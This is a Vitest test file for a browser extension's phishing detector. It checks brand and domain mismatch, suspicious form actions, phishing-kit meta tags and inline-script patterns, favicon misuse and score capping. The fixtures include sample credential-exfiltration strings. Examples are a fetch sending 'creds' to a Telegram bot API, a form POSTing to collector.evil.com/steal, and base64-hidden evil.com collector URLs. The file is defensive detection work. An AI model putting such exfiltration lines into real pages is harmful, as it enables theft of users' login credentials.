import { describe, expect, it } from "vitest";
import {
  checkBrandMismatch,
  checkFormActions,
  checkPhishingKitSelectors,
  checkPhishingKitMeta,
  checkInlineScripts,
  checkFaviconMismatch,
  computeContentScore,
  domainBelongsToBrand,
  BRAND_TARGETS,
} from "../extension/src/content/content_analyzer_model";
import type { FormInfo } from "../extension/src/content/content_analyzer_model";

describe("content_analyzer_model", () => {
  describe("checkBrandMismatch", () => {
    it("detects Google brand on non-Google domain", () => {
      const signals = checkBrandMismatch("evil-phish.com", true, "Sign in - Google Accounts");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.code).toBe("BRAND_DOMAIN_MISMATCH");
      expect(signals[0]!.label).toContain("Google");
    });

    it("detects Gmail brand on non-Google domain", () => {
      const signals = checkBrandMismatch("phish.example.com", true, "Gmail - Login");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Google");
    });

    it("detects Apple brand on non-Apple domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Apple ID Sign In");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Apple");
    });

    it("detects iCloud brand on non-Apple domain", () => {
      const signals = checkBrandMismatch("phish.example.com", true, "iCloud Login");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Apple");
    });

    it("detects Microsoft brand on non-Microsoft domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Microsoft Account - Sign In");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Microsoft");
    });

    it("detects Outlook brand on non-Microsoft domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Outlook - Sign In");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Microsoft");
    });

    it("detects Amazon brand on non-Amazon domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Amazon Sign-In");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Amazon");
    });

    it("detects PayPal brand on non-PayPal domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Log in to PayPal");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("PayPal");
    });

    it("detects Netflix brand on non-Netflix domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Netflix - Sign In");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Netflix");
    });

    it("detects Facebook brand on non-Facebook domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Facebook - Log In or Sign Up");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Facebook");
    });

    it("detects LinkedIn brand on non-LinkedIn domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "LinkedIn Login");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("LinkedIn");
    });

    it("detects Chase brand on non-Chase domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Chase Online - Sign In");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Chase");
    });

    it("detects Wells Fargo brand on non-Wells Fargo domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Wells Fargo - Online Banking");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Wells Fargo");
    });

    it("detects USPS brand on non-USPS domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "USPS Tracking - Login");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("USPS");
    });

    it("detects DHL brand on non-DHL domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "DHL Express - Login");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("DHL");
    });

    it("detects FedEx brand on non-FedEx domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "FedEx - Log In");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("FedEx");
    });

    it("detects Spotify brand on non-Spotify domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Spotify - Login");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Spotify");
    });

    it("detects Steam brand on non-Steam domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Steam Community :: Login");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Steam");
    });

    it("detects Discord brand on non-Discord domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Discord - Login");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Discord");
    });

    it("detects GitHub brand on non-GitHub domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "GitHub - Sign in");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("GitHub");
    });

    it("detects Coinbase brand on non-Coinbase domain", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "Coinbase - Sign In");
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.label).toContain("Coinbase");
    });

    it("does NOT trigger on legitimate Google domain", () => {
      const signals = checkBrandMismatch("google.com", true, "Sign in - Google Accounts");
      expect(signals.length).toBe(0);
    });

    it("does NOT trigger on legitimate Apple domain", () => {
      const signals = checkBrandMismatch("apple.com", true, "Apple ID");
      expect(signals.length).toBe(0);
    });

    it("does NOT trigger on legitimate PayPal domain", () => {
      const signals = checkBrandMismatch("paypal.com", true, "Log in to PayPal");
      expect(signals.length).toBe(0);
    });

    it("does NOT trigger on legitimate Microsoft domain (outlook.com)", () => {
      const signals = checkBrandMismatch("outlook.com", true, "Outlook Sign In");
      expect(signals.length).toBe(0);
    });

    it("does NOT trigger on legitimate Steam domain", () => {
      const signals = checkBrandMismatch("steampowered.com", true, "Steam Community :: Login");
      expect(signals.length).toBe(0);
    });

    it("does NOT trigger on legitimate Discord domain (discordapp.com)", () => {
      const signals = checkBrandMismatch("discordapp.com", true, "Discord Login");
      expect(signals.length).toBe(0);
    });

    it("does NOT trigger when no login form present", () => {
      const signals = checkBrandMismatch("evil.example.com", false, "Google Search Results");
      expect(signals.length).toBe(0);
    });

    it("does NOT trigger with empty visible text", () => {
      const signals = checkBrandMismatch("evil.example.com", true, "");
      expect(signals.length).toBe(0);
    });

    it("does NOT trigger with empty domain", () => {
      const signals = checkBrandMismatch("", true, "Google Sign In");
      expect(signals.length).toBe(0);
    });

    it("does NOT trigger on generic login page without brand names", () => {
      const signals = checkBrandMismatch("mycompany.com", true, "Sign in to your account");
      expect(signals.length).toBe(0);
    });

    it("score is 40 for brand mismatch", () => {
      const signals = checkBrandMismatch("evil.com", true, "Google Sign In");
      expect(signals[0]!.score).toBe(40);
    });
  });

  describe("checkFormActions", () => {
    it("flags data: URI form action", () => {
      const forms: FormInfo[] = [{ action: "data:text/html;base64,PHNjcmlwdD4=", method: "post" }];
      const signals = checkFormActions("example.com", forms);
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.code).toBe("FORM_ACTION_DATA_URI");
      expect(signals[0]!.score).toBe(45);
    });

    it("flags javascript: URI form action", () => {
      const forms: FormInfo[] = [{ action: "javascript:void(0)", method: "post" }];
      const signals = checkFormActions("example.com", forms);
      expect(signals.length).toBeGreaterThan(0);
      expect(signals[0]!.code).toBe("FORM_ACTION_JAVASCRIPT");
      expect(signals[0]!.score).toBe(35);
    });

    it("flags base64-encoded URL in form action", () => {
      const b64 = "aHR0cHM6Ly9ldmlsLmNvbS9jb2xsZWN0P3VzZXI9dGVzdCZwYXNzPXRlc3QxMjM0NTY3ODk=";
      const forms: FormInfo[] = [{ action: `https://example.com/redir?u=${b64}`, method: "post" }];
      const signals = checkFormActions("example.com", forms);
      expect(signals.some((s) => s.code === "FORM_ACTION_BASE64")).toBe(true);
    });

    it("flags cross-domain POST", () => {
      const forms: FormInfo[] = [
        { action: "https://collector.evil.com/steal", method: "post" }
      ];
      const signals = checkFormActions("example.com", forms);
      expect(signals.some((s) => s.code === "FORM_ACTION_CROSS_DOMAIN_POST")).toBe(true);
    });

    it("does NOT flag same-domain POST", () => {
      const forms: FormInfo[] = [
        { action: "https://example.com/auth", method: "post" }
      ];
      const signals = checkFormActions("example.com", forms);
      expect(signals.some((s) => s.code === "FORM_ACTION_CROSS_DOMAIN_POST")).toBe(false);
    });

    it("does NOT flag cross-domain GET", () => {
      const forms: FormInfo[] = [
        { action: "https://other.com/results", method: "get" }
      ];
      const signals = checkFormActions("example.com", forms);
      expect(signals.some((s) => s.code === "FORM_ACTION_CROSS_DOMAIN_POST")).toBe(false);
    });

    it("does NOT flag empty form action", () => {
      const forms: FormInfo[] = [{ action: "", method: "post" }];
      const signals = checkFormActions("example.com", forms);
      expect(signals.length).toBe(0);
    });

    it("does NOT flag whitespace-only form action", () => {
      const forms: FormInfo[] = [{ action: "   ", method: "post" }];
      const signals = checkFormActions("example.com", forms);
      expect(signals.length).toBe(0);
    });

    it("handles multiple forms with mixed signals", () => {
      const forms: FormInfo[] = [
        { action: "https://example.com/safe", method: "post" },
        { action: "data:text/html,malicious", method: "post" },
      ];
      const signals = checkFormActions("example.com", forms);
      expect(signals.some((s) => s.code === "FORM_ACTION_DATA_URI")).toBe(true);
    });

    it("handles malformed URL gracefully", () => {
      const forms: FormInfo[] = [{ action: "ht tp://not a valid url", method: "post" }];
      const signals = checkFormActions("example.com", forms);
      expect(signals.length).toBe(0);
    });
  });

  describe("checkPhishingKitSelectors", () => {
    it("produces signals for matched selectors", () => {
      const signals = checkPhishingKitSelectors([
        'Element with id "phishing-page"',
        'Input collecting victim password',
      ]);
      expect(signals.length).toBe(2);
      expect(signals[0]!.code).toBe("PHISHING_KIT_SELECTOR");
      expect(signals[0]!.score).toBe(50);
    });

    it("returns empty for no matches", () => {
      const signals = checkPhishingKitSelectors([]);
      expect(signals.length).toBe(0);
    });
  });

  describe("checkPhishingKitMeta", () => {
    it("detects phishing kit author meta tag", () => {
      const signals = checkPhishingKitMeta([
        { name: "author", content: "phish-kit-v2" }
      ]);
      expect(signals.some((s) => s.code === "PHISHING_KIT_META")).toBe(true);
    });

    it("detects scampage in meta content", () => {
      const signals = checkPhishingKitMeta([
        { name: "description", content: "scampage credential harvest tool" }
      ]);
      expect(signals.some((s) => s.code === "PHISHING_KIT_META")).toBe(true);
    });

    it("detects credential harvester meta content", () => {
      const signals = checkPhishingKitMeta([
        { name: "generator", content: "cred_harvest v3.1" }
      ]);
      expect(signals.some((s) => s.code === "PHISHING_KIT_META")).toBe(true);
    });

    it("does NOT flag normal author meta", () => {
      const signals = checkPhishingKitMeta([
        { name: "author", content: "John Doe" }
      ]);
      expect(signals.length).toBe(0);
    });

    it("does NOT flag normal description meta", () => {
      const signals = checkPhishingKitMeta([
        { name: "description", content: "Welcome to our company login page" }
      ]);
      expect(signals.length).toBe(0);
    });
  });

  describe("checkInlineScripts", () => {
    it("detects Telegram bot exfiltration", () => {
      const signals = checkInlineScripts([
        'fetch("https://api.telegram.org/bot123:ABC/sendMessage", { body: creds })'
      ]);
      expect(signals.some((s) => s.code === "PHISHING_KIT_SCRIPT")).toBe(true);
      expect(signals.some((s) => s.label.includes("Telegram"))).toBe(true);
    });

    it("detects base64 decoding pattern", () => {
      const signals = checkInlineScripts([
        'var url = atob("aHR0cHM6Ly9ldmlsLmNvbS9jb2xsZWN0");'
      ]);
      expect(signals.some((s) => s.code === "PHISHING_KIT_SCRIPT")).toBe(true);
    });

    it("detects data: URI redirect in script", () => {
      const signals = checkInlineScripts([
        'document.location = "data:text/html;base64,abc"'
      ]);
      expect(signals.some((s) => s.code === "PHISHING_KIT_SCRIPT")).toBe(true);
    });

    it("detects exfil keyword", () => {
      const signals = checkInlineScripts(["function exfil(data) { /* ... */ }"]);
      expect(signals.some((s) => s.code === "PHISHING_KIT_SCRIPT")).toBe(true);
    });

    it("detects result.php pattern", () => {
      const signals = checkInlineScripts(['form.action = "result.php?token=abc123";']);
      expect(signals.some((s) => s.code === "PHISHING_KIT_SCRIPT")).toBe(true);
    });

    it("detects next.php pattern", () => {
      const signals = checkInlineScripts(['window.location = "next.php?step=2";']);
      expect(signals.some((s) => s.code === "PHISHING_KIT_SCRIPT")).toBe(true);
    });

    it("detects post.php pattern", () => {
      const signals = checkInlineScripts(['form.action = "post.php?user=test";']);
      expect(signals.some((s) => s.code === "PHISHING_KIT_SCRIPT")).toBe(true);
    });

    it("detects login_double pattern", () => {
      const signals = checkInlineScripts(["var login_double = true;"]);
      expect(signals.some((s) => s.code === "PHISHING_KIT_SCRIPT")).toBe(true);
    });

    it("detects email field value exfiltration", () => {
      const signals = checkInlineScripts([
        'var e = document.getElementById("email").value;'
      ]);
      expect(signals.some((s) => s.code === "PHISHING_KIT_SCRIPT")).toBe(true);
    });

    it("does NOT flag normal scripts", () => {
      const signals = checkInlineScripts([
        'document.getElementById("form").addEventListener("submit", validate);'
      ]);
      expect(signals.length).toBe(0);
    });

    it("skips very large scripts", () => {
      const signals = checkInlineScripts(["x".repeat(60000) + "exfil"]);
      expect(signals.length).toBe(0);
    });

    it("handles empty script text", () => {
      const signals = checkInlineScripts([""]);
      expect(signals.length).toBe(0);
    });
  });

  describe("checkFaviconMismatch", () => {
    it("detects Google favicon on non-Google domain", () => {
      const signals = checkFaviconMismatch(
        "evil.example.com",
        ["https://www.google.com/favicon.ico"],
        []
      );
      expect(signals.some((s) => s.code === "FAVICON_BRAND_MISMATCH")).toBe(true);
      expect(signals[0]!.label).toContain("Google");
    });

    it("detects Microsoft favicon on non-Microsoft domain", () => {
      const signals = checkFaviconMismatch(
        "evil.example.com",
        ["https://www.microsoft.com/favicon.ico"],
        []
      );
      expect(signals.some((s) => s.code === "FAVICON_BRAND_MISMATCH")).toBe(true);
    });

    it("detects Apple favicon on non-Apple domain", () => {
      const signals = checkFaviconMismatch(
        "evil.example.com",
        ["https://www.apple.com/favicon/apple-touch-icon.png"],
        []
      );
      expect(signals.some((s) => s.code === "FAVICON_BRAND_MISMATCH")).toBe(true);
    });

    it("does NOT flag Google favicon on Google domain", () => {
      const signals = checkFaviconMismatch(
        "google.com",
        ["https://www.google.com/favicon.ico"],
        []
      );
      expect(signals.length).toBe(0);
    });

    it("does NOT flag favicon from non-brand CDN", () => {
      const signals = checkFaviconMismatch(
        "example.com",
        ["https://cdn.example.com/favicon.ico"],
        []
      );
      expect(signals.length).toBe(0);
    });

    it("detects brand logo image from CDN", () => {
      const signals = checkFaviconMismatch(
        "evil.example.com",
        [],
        ["https://www.paypal.com/favicon/pp-logo.png"]
      );
      expect(signals.some((s) => s.code === "LOGO_BRAND_MISMATCH")).toBe(true);
    });

    it("does NOT flag PayPal logo on paypal.com", () => {
      const signals = checkFaviconMismatch(
        "paypal.com",
        [],
        ["https://www.paypal.com/favicon/pp-logo.png"]
      );
      expect(signals.length).toBe(0);
    });

    it("does NOT flag normal images", () => {
      const signals = checkFaviconMismatch(
        "example.com",
        [],
        ["https://cdn.example.com/photo.jpg"]
      );
      expect(signals.length).toBe(0);
    });

    it("returns empty for empty domain", () => {
      const signals = checkFaviconMismatch(
        "",
        ["https://www.google.com/favicon.ico"],
        []
      );
      expect(signals.length).toBe(0);
    });

    it("prefers favicon over logo detection (stops after first)", () => {
      const signals = checkFaviconMismatch(
        "evil.example.com",
        ["https://www.google.com/favicon.ico"],
        ["https://www.paypal.com/favicon/logo.png"]
      );
      expect(signals.length).toBe(1);
      expect(signals[0]!.code).toBe("FAVICON_BRAND_MISMATCH");
    });
  });

  describe("domainBelongsToBrand", () => {
    it("matches exact domain", () => {
      const google = BRAND_TARGETS.find((b) => b.brand === "Google");
      expect(google).toBeDefined();
      expect(domainBelongsToBrand("google.com", google!)).toBe(true);
    });

    it("matches alternate domain (gmail.com)", () => {
      const google = BRAND_TARGETS.find((b) => b.brand === "Google");
      expect(domainBelongsToBrand("gmail.com", google!)).toBe(true);
    });

    it("does not match unrelated domain", () => {
      const google = BRAND_TARGETS.find((b) => b.brand === "Google");
      expect(domainBelongsToBrand("evil.com", google!)).toBe(false);
    });
  });

  describe("computeContentScore", () => {
    it("sums signal scores", () => {
      const result = computeContentScore([
        { code: "A", label: "a", score: 20 },
        { code: "B", label: "b", score: 30 },
      ]);
      expect(result.totalScore).toBe(50);
      expect(result.signals.length).toBe(2);
    });

    it("caps total at 100", () => {
      const result = computeContentScore([
        { code: "A", label: "a", score: 60 },
        { code: "B", label: "b", score: 60 },
      ]);
      expect(result.totalScore).toBe(100);
    });

    it("returns 0 for no signals", () => {
      const result = computeContentScore([]);
      expect(result.totalScore).toBe(0);
      expect(result.signals.length).toBe(0);
    });
  });
});
